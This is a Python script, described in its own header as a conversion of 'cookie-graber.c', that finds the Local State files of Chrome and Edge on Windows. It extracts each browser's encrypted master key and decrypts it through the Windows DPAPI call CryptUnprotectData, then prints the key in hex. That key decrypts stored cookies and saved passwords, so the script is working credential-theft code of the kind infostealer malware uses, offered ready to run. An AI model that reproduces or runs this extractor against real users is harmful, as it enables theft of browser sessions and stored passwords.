#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Browser Master Encryption Key Extractor - Python Version
Converted from cookie-graber.c

This module extracts browser master encryption keys from Chrome and Edge browsers.
"""

import os
import sys
import base64
import json
import ctypes
from ctypes import wintypes
import winreg
from pathlib import Path

class BrowserKeyExtractor:
    """Extract browser master encryption keys"""
    
    def __init__(self):
        self.crypt32 = ctypes.windll.crypt32
        self.kernel32 = ctypes.windll.kernel32
        self.shell32 = ctypes.windll.shell32
        self.shlwapi = ctypes.windll.shlwapi
        
    def get_appdata_path(self):
        """Get Local AppData path"""
        try:
            # Get Local AppData path
            appdata = os.environ.get('LOCALAPPDATA')
            if not appdata:
                # Fallback method
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
                appdata = winreg.QueryValueEx(key, "Local AppData")[0]
                winreg.CloseKey(key)
            return appdata
        except Exception as e:
            print(f"Error getting AppData path: {e}")
            return None
    
    def read_file_content(self, filepath):
        """Read file content"""
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    return f.read()
            else:
                print(f"File not found: {filepath}")
                return None
        except Exception as e:
            print(f"Error reading file {filepath}: {e}")
            return None
    
    def extract_key_from_data(self, data):
        """Extract encrypted key from JSON data"""
        try:
            # Look for encrypted_key pattern
            pattern = '"encrypted_key":"'
            start = data.find(pattern)
            if start == -1:
                print("ERROR: Encrypted key pattern not found")
                return None
            
            start += len(pattern)
            end = data.find('"', start)
            if end == -1:
                print("ERROR: End of encrypted key pattern not found")
                return None
            
            key = data[start:end]
            print(f"Base64 key extracted: {key}")
            return key
        except Exception as e:
            print(f"Error extracting key: {e}")
            return None
    
    def decrypt_master_key(self, encrypted_key):
        """Decrypt master key using Windows DPAPI"""
        try:
            # Decode base64
            encrypted_bytes = base64.b64decode(encrypted_key)
            print(f"Base64 decoded key size: {len(encrypted_bytes)} bytes")
            
            # Skip the first 5 bytes (header)
            key_data = encrypted_bytes[5:]
            
            # Use Windows DPAPI to decrypt
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wintypes.DWORD),
                           ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
            
            # Prepare input data
            input_blob = DATA_BLOB()
            input_blob.cbData = len(key_data)
            input_blob.pbData = (ctypes.c_ubyte * len(key_data)).from_buffer_copy(key_data)
            
            # Prepare output data
            output_blob = DATA_BLOB()
            
            # Call CryptUnprotectData
            result = self.crypt32.CryptUnprotectData(
                ctypes.byref(input_blob),
                None,  # ppszDataDescr
                None,  # pOptionalEntropy
                None,  # pvReserved
                None,  # pPromptStruct
                0,     # dwFlags
                ctypes.byref(output_blob)
            )
            
            if result:
                # Convert decrypted data to hex string
                decrypted_data = ctypes.string_at(output_blob.pbData, output_blob.cbData)
                hex_key = ''.join(f'\\x{b:02x}' for b in decrypted_data)
                print(f"Master key is: {hex_key}")
                
                # Free memory
                self.kernel32.LocalFree(output_blob.pbData)
                return hex_key
            else:
                print("Failed to decrypt master key")
                return None
                
        except Exception as e:
            print(f"Error decrypting master key: {e}")
            return None
    
    def get_encryption_key_from_file(self, relative_path):
        """Get encryption key from browser's Local State file"""
        appdata = self.get_appdata_path()
        if not appdata:
            return None
        
        filepath = os.path.join(appdata, relative_path)
        print(f"Fetching browser master key from: {filepath}")
        
        # Read file content
        data = self.read_file_content(filepath)
        if not data:
            return None
        
        # Extract key from JSON
        key = self.extract_key_from_data(data)
        if not key:
            return None
        
        # Decrypt the key
        return self.decrypt_master_key(key)
    
    def extract_edge_key(self):
        """Extract Edge browser master key"""
        print("Extracting Edge Key")
        print("-" * 45)
        return self.get_encryption_key_from_file("Microsoft\\Edge\\User Data\\Local State")
    
    def extract_chrome_key(self):
        """Extract Chrome browser master key"""
        print("\nExtracting Chrome Key")
        print("-" * 45)
        return self.get_encryption_key_from_file("Google\\Chrome\\User Data\\Local State")
    
    def extract_all_keys(self):
        """Extract keys from all supported browsers"""
        print("Browser Master Encryption Key Extractor")
        print("=" * 50)
        
        edge_key = self.extract_edge_key()
        chrome_key = self.extract_chrome_key()
        
        print("\nExtraction completed")
        return {
            'edge': edge_key,
            'chrome': chrome_key
        }

def main():
    """Main function"""
    try:
        extractor = BrowserKeyExtractor()
        keys = extractor.extract_all_keys()
        
        print("\nSummary:")
        print(f"Edge key: {'Found' if keys['edge'] else 'Not found'}")
        print(f"Chrome key: {'Found' if keys['chrome'] else 'Not found'}")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()